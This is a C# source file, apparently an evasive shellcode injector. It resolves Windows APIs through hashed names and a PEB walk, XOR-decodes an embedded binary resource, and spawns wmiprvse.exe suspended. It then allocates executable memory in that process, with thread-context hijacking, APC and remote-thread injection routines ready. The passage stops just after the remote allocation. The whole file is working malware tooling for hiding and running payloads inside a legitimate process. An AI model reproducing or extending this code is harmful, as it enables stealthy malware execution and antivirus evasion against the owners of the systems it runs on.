using System;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;





static class ApiHash
{
    public static string LowerAscii(string s)
    {
        if (string.IsNullOrEmpty(s))
            return s ?? string.Empty;
        char[] a = s.ToCharArray();
        for (int i = 0; i < a.Length; i++)
        {
            if (a[i] >= 'A' && a[i] <= 'Z')
                a[i] = (char)(a[i] + 32);
        }
        return new string(a);
    }

    public static uint Hash(string s)
    {
        unchecked
        {
            uint u = (uint)(1009 - s.Length);
            uint v = (uint)s.Length + 9176u;
            for (int k = 0; k < s.Length; k++)
            {
                uint c = s[k];
                u = u + c - (uint)k;
                v = v - c + (uint)k;
                v = v + u - c;
            }
            return u - v + (uint)s.Length * 503u;
        }
    }
}

static class ModuleResolver
{
    [DllImport("ntdll.dll")]
    static extern IntPtr RtlGetCurrentPeb();
    

    public static IntPtr ByHash(uint moduleNameHash)
    {
        IntPtr peb = RtlGetCurrentPeb();
        if (peb == IntPtr.Zero)
            return IntPtr.Zero;

        bool is64 = IntPtr.Size == 8;
        int offPebLdr = is64 ? 0x18 : 0x0C;
        int offLdrInMemoryOrderList = is64 ? 0x20 : 0x14;
        int offLdrEntryInMemoryOrderLinks = is64 ? 0x10 : 0x08;
        int offLdrEntryDllBase = is64 ? 0x30 : 0x18;
        int offLdrEntryFullDllName = is64 ? 0x48 : 0x24;
        int offLdrEntryBaseDllName = is64 ? 0x58 : 0x2C;
        int offUnicodeBuffer = is64 ? 8 : 4;

        IntPtr ldr = Marshal.ReadIntPtr(IntPtr.Add(peb, (int)offPebLdr));
        if (ldr == IntPtr.Zero)
            return IntPtr.Zero;

        IntPtr listHead = IntPtr.Add(ldr, (int)offLdrInMemoryOrderList);
        IntPtr link = Marshal.ReadIntPtr(listHead);

        for (int i = 0; i < 512 && link != IntPtr.Zero && link != listHead; i++)
        {
            IntPtr entry = IntPtr.Add(link, -(int)offLdrEntryInMemoryOrderLinks);
            IntPtr dllBase = Marshal.ReadIntPtr(IntPtr.Add(entry, (int)offLdrEntryDllBase));

            if (TryModuleNameForHash(entry, offLdrEntryBaseDllName, offLdrEntryFullDllName, offUnicodeBuffer, out string fileName)
                && HasDosNtPeHeaders(dllBase)
                && fileName != null
                && ApiHash.Hash(ApiHash.LowerAscii(fileName)) == moduleNameHash)
            {
                return dllBase;
            }

            link = Marshal.ReadIntPtr(link);
        }

        return IntPtr.Zero;
    }

    static bool TryModuleNameForHash(
        IntPtr ldrEntry,
        int offBaseDllName,
        int offFullDllName,
        int offUnicodeBuffer,
        out string fileName)
    {
        fileName = null;
        if (TryReadUnicodeFileName(IntPtr.Add(ldrEntry, offBaseDllName), offUnicodeBuffer, out string baseName))
        {
            fileName = baseName;
            return true;
        }

        if (!TryReadUnicodeFileName(IntPtr.Add(ldrEntry, offFullDllName), offUnicodeBuffer, out string full) || full == null)
            return false;

        int slash = full.LastIndexOf('\\');
        fileName = slash >= 0 && slash < full.Length - 1 ? full.Substring(slash + 1) : full;
        return !string.IsNullOrEmpty(fileName);
    }

    static bool TryReadUnicodeFileName(IntPtr unicodeString, int offBuffer, out string s)
    {
        s = null;
        int byteLen = Marshal.ReadInt16(unicodeString);
        if (byteLen <= 0 || (byteLen & 1) != 0)
            return false;

        IntPtr buffer = Marshal.ReadIntPtr(IntPtr.Add(unicodeString, offBuffer));
        if (buffer == IntPtr.Zero)
            return false;

        s = Marshal.PtrToStringUni(buffer, byteLen / 2);
        return !string.IsNullOrEmpty(s);
    }

    static bool HasDosNtPeHeaders(IntPtr imageBase)
    {
        if (imageBase == IntPtr.Zero)
            return false;

        if (Marshal.ReadInt16(imageBase) != 0x5A4D)
            return false;

        int eLfanew = Marshal.ReadInt32(IntPtr.Add(imageBase, 0x3C));
        if (eLfanew < 4 || eLfanew > 0x4000)
            return false;

        return Marshal.ReadInt32(IntPtr.Add(imageBase, eLfanew)) == 0x00004550;
    }
}

static class PeExports
{
    public static bool TryGetProcByHash(IntPtr moduleBase, uint nameHash, out IntPtr pfn)
    {
        return TryGetProcByHash(moduleBase, nameHash, 0, out pfn);
    }

    static bool TryGetProcByHash(IntPtr moduleBase, uint nameHash, int depth, out IntPtr pfn)
    {
        pfn = IntPtr.Zero;
        if (moduleBase == IntPtr.Zero || depth > 16)
            return false;

        int e_lfanew = Marshal.ReadInt32(IntPtr.Add(moduleBase, 0x3C));
        if (e_lfanew < 4 || e_lfanew > 0x4000)
            return false;

        IntPtr nt = IntPtr.Add(moduleBase, e_lfanew);
        if (Marshal.ReadInt32(nt) != 0x00004550)
            return false;

        ushort magic = (ushort)Marshal.ReadInt16(IntPtr.Add(nt, 24));
        int exportRva;
        int exportSize;
        if (magic == 0x20B)
        {
            exportRva = Marshal.ReadInt32(IntPtr.Add(nt, 24 + 112));
            exportSize = Marshal.ReadInt32(IntPtr.Add(nt, 24 + 116));
        }
        else if (magic == 0x10B)
        {
            exportRva = Marshal.ReadInt32(IntPtr.Add(nt, 24 + 96));
            exportSize = Marshal.ReadInt32(IntPtr.Add(nt, 24 + 100));
        }
        else
            return false;

        if (exportRva == 0 || exportSize == 0)
            return false;

        IntPtr expDir = IntPtr.Add(moduleBase, exportRva);
        int numberOfNames = Marshal.ReadInt32(IntPtr.Add(expDir, 24));
        int addrOfFunctions = Marshal.ReadInt32(IntPtr.Add(expDir, 28));
        int addrOfNames = Marshal.ReadInt32(IntPtr.Add(expDir, 32));
        int addrOfNameOrdinals = Marshal.ReadInt32(IntPtr.Add(expDir, 36));

        for (int i = 0; i < numberOfNames; i++)
        {
            int nameRva = Marshal.ReadInt32(IntPtr.Add(moduleBase, addrOfNames + i * 4));
            string exportName = Marshal.PtrToStringAnsi(IntPtr.Add(moduleBase, nameRva));
            if (exportName == null || ApiHash.Hash(exportName) != nameHash)
                continue;

            ushort ord = (ushort)Marshal.ReadInt16(IntPtr.Add(moduleBase, addrOfNameOrdinals + i * 2));
            int funcRva = Marshal.ReadInt32(IntPtr.Add(moduleBase, addrOfFunctions + ord * 4));
            if (funcRva == 0)
                return false;

            if (funcRva >= exportRva && funcRva < exportRva + exportSize)
            {
                string fwd = Marshal.PtrToStringAnsi(IntPtr.Add(moduleBase, funcRva));
                if (string.IsNullOrEmpty(fwd))
                    return false;
                int dot = fwd.IndexOf('.');
                if (dot <= 0 || dot >= fwd.Length - 1)
                    return false;
                string dllFile = ApiHash.LowerAscii(fwd.Substring(0, dot) + ".dll");
                string exportPart = fwd.Substring(dot + 1);
                uint dllHash = ApiHash.Hash(dllFile);
                IntPtr next = ModuleResolver.ByHash(dllHash);
                if (next == IntPtr.Zero)
                    return false;
                return TryGetProcByHash(next, ApiHash.Hash(exportPart), depth + 1, out pfn);
            }

            pfn = IntPtr.Add(moduleBase, funcRva);
            return true;
        }

        return false;
    }
}

static class NativeFromHashes
{
    // Module name hashes (lowercase file names; same strings as loader BaseDllName, e.g. kernel32.dll)
    const uint H_KERNEL32_DLL = 0xFFFFB946;
    const uint H_USER32_DLL = 0xFFFFC363;
    const uint H_NTDLL_DLL = 0xFFFFC750;
    // Export name tags (ASCII; same ApiHash.Hash as modules)
    const uint H_CreateProcessA = 0xFFFFADD7;
    const uint H_VirtualAllocEx = 0xFFFFACC9;
    const uint H_WriteProcessMemory = 0xFFFF9159;
    const uint H_CreateRemoteThread = 0xFFFF92EC;
    const uint H_ResumeThread = 0xFFFFB8BC;
    const uint H_MessageBoxW = 0xFFFFBE71;
    const uint H_LoadLibraryW = 0xFFFFB9EC;


    const uint h_NtQueryInformationProcess = 0xFFFF544C;

    const uint H_QueueUserAPC = 0xFFFFB865;
    const uint H_GetThreadContext = 0xFFFFA1F8;
    const uint H_SetThreadContext = 0xFFFFA15C;
    const uint H_WaitForSingleObject = 0xFFFF8B8B;

  

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Ansi)]
    public delegate bool CreateProcessADelegate(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref Program2Test.STARTUPINFOA lpStartupInfo,
        out Program2Test.PROCESS_INFORMATION lpProcessInformation);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    public delegate IntPtr VirtualAllocExDelegate(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    public delegate bool WriteProcessMemoryDelegate(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out IntPtr lpNumberOfBytesWritten);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    public delegate IntPtr CreateRemoteThreadDelegate(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId);


    [StructLayout(LayoutKind.Sequential)]
    public struct T2_SET_PARAMETERS
    {
        public uint Version;          // ULONG
        public uint Reserved;         // ULONG
        public long NoWakeTolerance;  // LONGLONG (100ns units)
    }



 

    public enum PROCESSINFOCLASS
    {
        ProcessBasicInformation = 0,
        ProcessQuotaLimits = 1,
        ProcessIoCounters = 2,
        ProcessVmCounters = 3,
        ProcessTimes = 4,
        ProcessBasePriority = 5,
        ProcessRaisePriority = 6,
        ProcessDebugPort = 7,
        ProcessExceptionPort = 8,
        ProcessAccessToken = 9,
        ProcessLdtInformation = 10,
        ProcessLdtSize = 11,
        ProcessDefaultHardErrorMode = 12,
        ProcessIoPortHandlers = 13,
        ProcessPooledUsageAndLimits = 14,
        ProcessWorkingSetWatch = 15,
        ProcessUserModeIOPL = 16,
        ProcessEnableAlignmentFaultFixup = 17,
        ProcessPriorityClass = 18,
        ProcessWx86Information = 19,
        ProcessHandleCount = 20,
        ProcessAffinityMask = 21,
        ProcessPriorityBoost = 22,
        ProcessDeviceMap = 23,
        ProcessSessionInformation = 24,
        ProcessForegroundInformation = 25,
        ProcessWow64Information = 26,
        ProcessImageFileName = 27,
        ProcessLUIDDeviceMapsEnabled = 28,
        ProcessBreakOnTermination = 29,
        ProcessDebugObjectHandle = 30,
        ProcessDebugFlags = 31,
        ProcessHandleTracing = 32,
        ProcessIoPriority = 33,
        ProcessExecuteFlags = 34,
        ProcessTlsInformation = 35,
        ProcessCookie = 36,
        ProcessImageInformation = 37,
        ProcessCycleTime = 38,
        ProcessPagePriority = 39,
        ProcessInstrumentationCallback = 40,
        ProcessThreadStackAllocation = 41,
        ProcessWorkingSetWatchEx = 42,
        ProcessImageFileNameWin32 = 43,
        ProcessImageFileMapping = 44,
        ProcessAffinityUpdateMode = 45,
        ProcessMemoryAllocationMode = 46,
        ProcessGroupInformation = 47,
        ProcessTokenVirtualizationEnabled = 48,
        ProcessOwnerInformation = 49,
        ProcessWindowInformation = 50,
        ProcessHandleInformation = 51,
        ProcessMitigationPolicy = 52,
        ProcessDynamicFunctionTableInformation = 53,
        ProcessHandleCheckingMode = 54,
        ProcessKeepAliveCount = 55,
        ProcessRevokeFileHandles = 56,
        ProcessWorkingSetControl = 57,
        ProcessHandleTable = 58,
        ProcessCheckStackExtentsMode = 59,
        ProcessCommandLineInformation = 60,
        ProcessProtectionInformation = 61,
        ProcessMemoryExhaustion = 62,
        ProcessFaultInformation = 63,
        ProcessTelemetryIdInformation = 64,
        ProcessCommitReleaseInformation = 65,
        ProcessReserved1Information = 66,
        ProcessReserved2Information = 67,
        ProcessSubsystemProcess = 68,
        ProcessInPrivate = 70,
        ProcessRaiseUMExceptionOnInvalidHandleClose = 71,
        ProcessSubsystemInformation = 75,
        ProcessWin32kSyscallFilterInformation = 79,
        ProcessEnergyTrackingState = 82,
        MaxProcessInfoClass = 83,
    }
    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    public delegate IntPtr NtQueryInformationProcessDelegate(IntPtr pHandle, PROCESSINFOCLASS pInfoClass, IntPtr pInfo, ulong pInfoLen, ref ulong retLen);



    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    public delegate uint ResumeThreadDelegate(IntPtr hThread);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
    public delegate int MessageBoxWDelegate(IntPtr hWnd, string lpText, string lpCaption, uint uType);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
    public delegate IntPtr LoadLibraryWDelegate(string lpLibFileName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    public delegate uint QueueUserAPCDelegate(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    public delegate bool GetThreadContextDelegate(IntPtr hThread, IntPtr lpContext);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    public delegate bool SetThreadContextDelegate(IntPtr hThread, IntPtr lpContext);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
    public delegate uint WaitForSingleObjectDelegate(IntPtr hHandle, uint dwMilliseconds);

    public static readonly CreateProcessADelegate CreateProcessA;
    public static readonly VirtualAllocExDelegate VirtualAllocEx;
    public static readonly WriteProcessMemoryDelegate WriteProcessMemory;
    public static readonly CreateRemoteThreadDelegate CreateRemoteThread;
    public static readonly ResumeThreadDelegate ResumeThread;
    public static readonly MessageBoxWDelegate MessageBoxW;

 
    public static readonly NtQueryInformationProcessDelegate NtQueryInformationProcess;
  
    public static readonly QueueUserAPCDelegate QueueUserAPC;
    public static readonly GetThreadContextDelegate GetThreadContext;
    public static readonly SetThreadContextDelegate SetThreadContext;
    public static readonly WaitForSingleObjectDelegate WaitForSingleObject;

    static NativeFromHashes()
    {
        IntPtr k32 = ModuleResolver.ByHash(H_KERNEL32_DLL);
        if (k32 == IntPtr.Zero)
            throw new InvalidOperationException("kernel32 not found");

        IntPtr ntdll = ModuleResolver.ByHash(H_NTDLL_DLL);
        if (ntdll == IntPtr.Zero)
            throw new InvalidOperationException("n t d l l not found");

        if (!PeExports.TryGetProcByHash(k32, H_CreateProcessA, out IntPtr pCreateProcessA))
            throw new InvalidOperationException("CreateProcessA");
        if (!PeExports.TryGetProcByHash(k32, H_VirtualAllocEx, out IntPtr pVirtualAllocEx))
            throw new InvalidOperationException("VirtualAllocEx");
        if (!PeExports.TryGetProcByHash(k32, H_WriteProcessMemory, out IntPtr pWriteProcessMemory))
            throw new InvalidOperationException("WriteProcessMemory");
        if (!PeExports.TryGetProcByHash(k32, H_CreateRemoteThread, out IntPtr pCreateRemoteThread))
            throw new InvalidOperationException("CreateRemoteThread");
        if (!PeExports.TryGetProcByHash(k32, H_ResumeThread, out IntPtr pResumeThread))
            throw new InvalidOperationException("ResumeThread");
        if (!PeExports.TryGetProcByHash(k32, H_LoadLibraryW, out IntPtr pLoadLibraryW))
            throw new InvalidOperationException("LoadLibraryW");
   

        if (!PeExports.TryGetProcByHash(ntdll, h_NtQueryInformationProcess, out IntPtr pNteQueryInformationProcess))
            throw new InvalidOperationException("h ntwueryinformationprocess lol");
        if (!PeExports.TryGetProcByHash(k32, H_QueueUserAPC, out IntPtr pQueueUserAPC))
            throw new InvalidOperationException("QueueUserAPC");
        if (!PeExports.TryGetProcByHash(k32, H_GetThreadContext, out IntPtr pGetThreadContext))
            throw new InvalidOperationException("GetThreadContext");
        if (!PeExports.TryGetProcByHash(k32, H_SetThreadContext, out IntPtr pSetThreadContext))
            throw new InvalidOperationException("SetThreadContext");
        if (!PeExports.TryGetProcByHash(k32, H_WaitForSingleObject, out IntPtr pWaitForSingleObject))
            throw new InvalidOperationException("WaitForSingleObject");

        CreateProcessA = Marshal.GetDelegateForFunctionPointer<CreateProcessADelegate>(pCreateProcessA);
        VirtualAllocEx = Marshal.GetDelegateForFunctionPointer<VirtualAllocExDelegate>(pVirtualAllocEx);
        WriteProcessMemory = Marshal.GetDelegateForFunctionPointer<WriteProcessMemoryDelegate>(pWriteProcessMemory);
        CreateRemoteThread = Marshal.GetDelegateForFunctionPointer<CreateRemoteThreadDelegate>(pCreateRemoteThread);
        ResumeThread = Marshal.GetDelegateForFunctionPointer<ResumeThreadDelegate>(pResumeThread);

     
        QueueUserAPC = Marshal.GetDelegateForFunctionPointer<QueueUserAPCDelegate>(pQueueUserAPC);
        GetThreadContext = Marshal.GetDelegateForFunctionPointer<GetThreadContextDelegate>(pGetThreadContext);
        SetThreadContext = Marshal.GetDelegateForFunctionPointer<SetThreadContextDelegate>(pSetThreadContext);
        WaitForSingleObject = Marshal.GetDelegateForFunctionPointer<WaitForSingleObjectDelegate>(pWaitForSingleObject);
        //        LdrCallEnclave = Marshal.GetDelegateForFunctionPointer<LdrCallEnclaveDelegate>(pLdrEnclaveCall);
        var loadLibraryW = Marshal.GetDelegateForFunctionPointer<LoadLibraryWDelegate>(pLoadLibraryW);

        IntPtr u32 = ModuleResolver.ByHash(H_USER32_DLL);
        if (u32 == IntPtr.Zero)
            u32 = loadLibraryW(new string(new char[] { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l' }));

        if (u32 == IntPtr.Zero || !PeExports.TryGetProcByHash(u32, H_MessageBoxW, out IntPtr pMessageBoxW))
            throw new InvalidOperationException("MessageBoxW");

        MessageBoxW = Marshal.GetDelegateForFunctionPointer<MessageBoxWDelegate>(pMessageBoxW);
    }
}




class Program2Test
{

    
    enum InjectionTechnique
    {
        SetThreadExecution,
        QueueUserApc,
        CreateRemoteThread,
    }


        const uint CONTEXT_AMD64 = 0x00100000;
    const uint CONTEXT_i386 = 0x00010000;
    const uint CONTEXT_CONTROL = 0x00000001;
    const uint CONTEXT_CONTROL_AMD64 = CONTEXT_AMD64 | CONTEXT_CONTROL; // 0x100001
    const uint CONTEXT_CONTROL_X86 = CONTEXT_i386 | CONTEXT_CONTROL;    // 0x10001
    const int ContextSizeAmd64 = 1232;
    const int ContextSizeX86 = 716;
    const int ContextFlagsOffsetAmd64 = 0x30;
    const int ContextFlagsOffsetX86 = 0x00;
    const int ContextIpOffsetAmd64 = 0xF8; // Rip
    const int ContextIpOffsetX86 = 0xB8;   // Eip

    static IntPtr AllocAlignedContextBuffer(int size, out IntPtr rawAllocation)
    {
        rawAllocation = Marshal.AllocHGlobal(size + 16);
        long aligned = (rawAllocation.ToInt64() + 15L) & ~15L;
        return new IntPtr(aligned);
    }

      static void ZeroMemory(IntPtr ptr, int size)
  {
      for (int i = 0; i < size; i++)
          Marshal.WriteByte(ptr, i, 0);
  }

    /// CONTEXT_CONTROL hijack: set RIP/EIP to shellcode, resume, wait (CREATE_SUSPENDED thread).
    static bool SetThreadExecution(IntPtr hThread, IntPtr pAddress)
    {
        bool is64 = IntPtr.Size == 8;
        int ctxSize = is64 ? ContextSizeAmd64 : ContextSizeX86;
        uint contextControl = is64 ? CONTEXT_CONTROL_AMD64 : CONTEXT_CONTROL_X86;

        IntPtr ctx = AllocAlignedContextBuffer(ctxSize, out IntPtr rawCtx);
        try
        {
            ZeroMemory(ctx, ctxSize);
            Marshal.WriteInt32(ctx, is64 ? ContextFlagsOffsetAmd64 : ContextFlagsOffsetX86, (int)contextControl);

            if (!NativeFromHashes.GetThreadContext(hThread, ctx))
                return false;

            if (is64)
                Marshal.WriteInt64(ctx, ContextIpOffsetAmd64, pAddress.ToInt64());
            else
                Marshal.WriteInt32(ctx, ContextIpOffsetX86, pAddress.ToInt32());

            if (!NativeFromHashes.SetThreadContext(hThread, ctx))
                return false;

            NativeFromHashes.ResumeThread(hThread);
            NativeFromHashes.WaitForSingleObject(hThread, 0xFFFFFFFF);
            return true;
        }
        finally
        {
            Marshal.FreeHGlobal(rawCtx);
        }
    }

    internal const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    internal const short SW_HIDE = 0x0;
    internal const int STARTF_USESHOWWINDOW = 0x00000001;
    internal const uint CREATE_NO_WINDOW = 0x08000000;
    internal const uint DETACHED_PROCESS = 0x00000008;
    internal const uint GENERIC_WRITE = 0x40000000;
    internal const uint MEM_COMMIT = 0x00001000;
    internal const uint MEM_RESERVE = 0x00002000;
    internal const uint PAGE_EXECUTE_READWRITE = 0x40;
    internal const uint PAGE_READWRITE = 0x04;
    internal const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;



    public enum PROCESSINFOCLASS
    {
        ProcessBasicInformation = 0,
        ProcessQuotaLimits = 1,
        ProcessIoCounters = 2,
        ProcessVmCounters = 3,
        ProcessTimes = 4,
        ProcessBasePriority = 5,
        ProcessRaisePriority = 6,
        ProcessDebugPort = 7,
        ProcessExceptionPort = 8,
        ProcessAccessToken = 9,
        ProcessLdtInformation = 10,
        ProcessLdtSize = 11,
        ProcessDefaultHardErrorMode = 12,
        ProcessIoPortHandlers = 13,
        ProcessPooledUsageAndLimits = 14,
        ProcessWorkingSetWatch = 15,
        ProcessUserModeIOPL = 16,
        ProcessEnableAlignmentFaultFixup = 17,
        ProcessPriorityClass = 18,
        ProcessWx86Information = 19,
        ProcessHandleCount = 20,
        ProcessAffinityMask = 21,
        ProcessPriorityBoost = 22,
        ProcessDeviceMap = 23,
        ProcessSessionInformation = 24,
        ProcessForegroundInformation = 25,
        ProcessWow64Information = 26,
        ProcessImageFileName = 27,
        ProcessLUIDDeviceMapsEnabled = 28,
        ProcessBreakOnTermination = 29,
        ProcessDebugObjectHandle = 30,
        ProcessDebugFlags = 31,
        ProcessHandleTracing = 32,
        ProcessIoPriority = 33,
        ProcessExecuteFlags = 34,
        ProcessTlsInformation = 35,
        ProcessCookie = 36,
        ProcessImageInformation = 37,
        ProcessCycleTime = 38,
        ProcessPagePriority = 39,
        ProcessInstrumentationCallback = 40,
        ProcessThreadStackAllocation = 41,
        ProcessWorkingSetWatchEx = 42,
        ProcessImageFileNameWin32 = 43,
        ProcessImageFileMapping = 44,
        ProcessAffinityUpdateMode = 45,
        ProcessMemoryAllocationMode = 46,
        ProcessGroupInformation = 47,
        ProcessTokenVirtualizationEnabled = 48,
        ProcessOwnerInformation = 49,
        ProcessWindowInformation = 50,
        ProcessHandleInformation = 51,
        ProcessMitigationPolicy = 52,
        ProcessDynamicFunctionTableInformation = 53,
        ProcessHandleCheckingMode = 54,
        ProcessKeepAliveCount = 55,
        ProcessRevokeFileHandles = 56,
        ProcessWorkingSetControl = 57,
        ProcessHandleTable = 58,
        ProcessCheckStackExtentsMode = 59,
        ProcessCommandLineInformation = 60,
        ProcessProtectionInformation = 61,
        ProcessMemoryExhaustion = 62,
        ProcessFaultInformation = 63,
        ProcessTelemetryIdInformation = 64,
        ProcessCommitReleaseInformation = 65,
        ProcessReserved1Information = 66,
        ProcessReserved2Information = 67,
        ProcessSubsystemProcess = 68,
        ProcessInPrivate = 70,
        ProcessRaiseUMExceptionOnInvalidHandleClose = 71,
        ProcessSubsystemInformation = 75,
        ProcessWin32kSyscallFilterInformation = 79,
        ProcessEnergyTrackingState = 82,
        MaxProcessInfoClass = 83,
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_HANDLE_SNAPSHOT_INFORMATION
    {
        public IntPtr NumberOfHandles; // c++ = ULONG_PTR -> c# = IntPtr
        public IntPtr Reserved; // c++ = ULONG_PTR -> c# = IntPtr
        public PROCESS_HANDLE_TABLE_ENTRY_INFO[] Handles;
    }
           [StructLayout(LayoutKind.Explicit, Pack = 1)]
        public unsafe struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION
        {
            [FieldOffset(0)]
            public IntPtr NumberOfHandles; // c++ = ULONG_PTR -> c# = IntPtr
            [FieldOffset(8)]
            public IntPtr Reserved; // c++ = ULONG_PTR -> c# = IntPtr
            [FieldOffset(16)]
            public fixed byte Handles[1];
        }


 
 
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_HANDLE_TABLE_ENTRY_INFO
    {
        public IntPtr HandleValue;
        public IntPtr HandleCount;
        public IntPtr PointerCount;
        public uint GrantedAccess;
        public uint ObjectTypeIndex;
        public uint HandleAttributes;
        public uint Reserved;
    }





    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
    public static extern IntPtr realloc(IntPtr ptr, ulong size);
    // Based on:https://github.com/strozfriedberg/SharpParty
    // this is taken from Sharpparty 
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public unsafe struct _PUBLIC_OBJECT_TYPE_INFORMATION
    {
        public UNICODE_STRING TypeName; // c++ = UNICODE_STRING (char *) -> c# = IntPtr
        public fixed ulong Reserved[22]; // c++ = ULONG Reserved[22] -> c# = ulong*
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    public enum _OBJECT_INFORMATION_CLASS
    {
        ObjectBasicInformation = 0,
        ObjectTypeInformation = 2,
    }


    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    private static string StringFromUnicodeString(in UNICODE_STRING us)
    {
        if (us.Length == 0 || us.Buffer == IntPtr.Zero)
            return string.Empty;
        return Marshal.PtrToStringUni(us.Buffer, us.Length / 2) ?? string.Empty;
    }



    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOA
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }




    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
    [Flags]
    public enum AllocationType : uint
    {
        MEM_COMMIT = 0x1000,
        MEM_RESERVE = 0x2000
    }

    [Flags]
    public enum MemoryProtection : uint
    {
        PAGE_EXECUTE_READWRITE = 0x40
    }
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
IntPtr lpAddress,
UIntPtr dwSize,
AllocationType flAllocationType,
MemoryProtection flProtect);


    [Flags]
    public enum ProcessAccessRights : uint
    {
        Terminate = 0x0001,
        CreateThread = 0x0002,
        SetSessionId = 0x0004,
        VmOperation = 0x0008,
        VmRead = 0x0010,
        VmWrite = 0x0020,
        DupHandle = 0x0040,
        CreateProcess = 0x0080,
        SetQuota = 0x0100,
        SetInformation = 0x0200,
        QueryInformation = 0x0400,
        SuspendResume = 0x0800,
        QueryLimitedInformation = 0x1000,
        SetLimitedInformation = 0x2000
    }


    public enum TP_CALLBACK_PRIORITY : int
    {
        TP_CALLBACK_PRIORITY_INVALID = -1,
        TP_CALLBACK_PRIORITY_HIGH = 0,
        TP_CALLBACK_PRIORITY_NORMAL = 1,
        TP_CALLBACK_PRIORITY_LOW = 2,
        TP_CALLBACK_PRIORITY_COUNT = 3,
    }


     static readonly byte[] XorKey3 = { 0x4B, 0x7E, 0x31 };

         static void popoInPlace(byte[] data, byte[] key3)
        {
            if (key3 == null || key3.Length == 0)
            {
                return;
            }
            for (int i = 0; i < data.Length; i++)
            {
                int num = i;
                data[num] ^= key3[i % key3.Length];
            }
        }


    public static void Main2Test()
    {


    Assembly executingAssembly = Assembly.GetExecutingAssembly();
            string name = "MTSCRANET.flummicsharpraawx86.bin";
            Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
            new StreamReader(manifestResourceStream);
            byte[] array = new byte[manifestResourceStream.Length];
            manifestResourceStream.Read(array, 0, array.Length);
            if (array.Length == 0)
            {
                return ;
            }
            popoInPlace(array, XorKey3);

        STARTUPINFOA structure = default;
        structure.cb = (uint)Marshal.SizeOf<STARTUPINFOA>();
        PROCESS_INFORMATION process_INFORMATION = default;
        if (!NativeFromHashes.CreateProcessA(
                "C:\\Windows\\system32\\wbem\\wmiprvse.exe",
                //"C:\\Windows\\system32\\Notepad.exe",
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                4U,
                IntPtr.Zero,
                null,
                ref structure,
                out process_INFORMATION))
        {
            NativeFromHashes.MessageBoxW(IntPtr.Zero, "Createprocessfailed", "Debug INfo", 64U);
            return;
        }





        IntPtr hProcess = process_INFORMATION.hProcess;
        IntPtr hThread = process_INFORMATION.hThread;

        int pid = (int)process_INFORMATION.dwProcessId;
        //int pid = 50000;
        //open the process to get the aprpropriate handle
        //hProcess = OpenProcess((uint)(ProcessAccessRights.VmRead | ProcessAccessRights.VmWrite | ProcessAccessRights.VmOperation | ProcessAccessRights.DupHandle | ProcessAccessRights.QueryInformation), false, pid);





        IntPtr intPtr = NativeFromHashes.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)array.Length, 4096U, 64U);
        //IntPtr intPtr2 = VirtualAlloc(IntPtr.Zero, (uint)array.Length, AllocationType.MEM_COMMIT | AllocationType.MEM_RESERVE, MemoryProtection.PAGE_EXECUTE_READWRITE);
        if (intPtr == IntPtr.Zero)
        {
            NativeFromHashes.MessageBoxW(IntPtr.Zero, "virtualallocfailed", "Debug INfo", 64U);
            return;
        }
        // Marshal.Copy(array, 0, intPtr2, array.Length);

